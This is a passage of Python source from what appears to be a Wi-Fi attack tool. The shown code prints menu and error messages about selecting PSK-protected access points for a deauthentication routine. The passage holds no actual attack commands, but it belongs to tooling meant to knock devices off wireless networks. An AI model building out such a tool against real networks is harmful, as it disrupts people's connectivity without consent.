                f'{ansi_escape_green(target_ap)} is not authenticated with  with {ansi_escape_green("PSK")} it was not in the list provided by {ansi_escape_green("get_authentication_from_airodump_output")} ')
            print(f'Here is the list of other SSIDs where the authentication is {ansi_escape_green("PSK")}')
            print("\n=======================================================================================\n")
            for ap in authentications:
                print(ansi_escape_green(ap))
            print("\n=======================================================================================\n")
            input(
                f"Press enter to return to Network attacks menu. and select any other network from the list above they all use {ansi_escape_green('PSK')}")
            return

    else:
        print('==================================================================================================\n')
        print(f'This message is from {ansi_escape_green("deauth_devices_in_targetAP_with_interval")}')
        print(f'There is a problem with {ansi_escape_red("get_devices_in_AP_output")}')
        input(f'input anything to return to previous function \n')
        return
